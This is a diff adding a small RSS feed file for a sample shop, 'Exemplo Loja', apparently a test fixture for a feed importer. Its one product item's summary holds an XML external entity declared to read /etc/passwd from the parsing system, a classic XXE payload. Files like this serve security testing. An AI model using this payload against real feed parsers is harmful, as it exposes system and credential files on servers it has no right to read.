@@ -1,0 +1,17 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE rss [
+  <!ELEMENT rss ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<rss version="2.0">
+  <channel>
+    <title>Exemplo Loja</title>
+    <item>
+      <source>rss</source>
+      <title>Produto Exemplo</title>
+      <summary>&xxe;</summary>
+      <link>https://www.exemploloja.com/produto/exemplo</link>
+      <image_url>https://www.exemploloja.com/images/produto.jpg</image_url>
+    </item>
+  </channel>
+</rss>
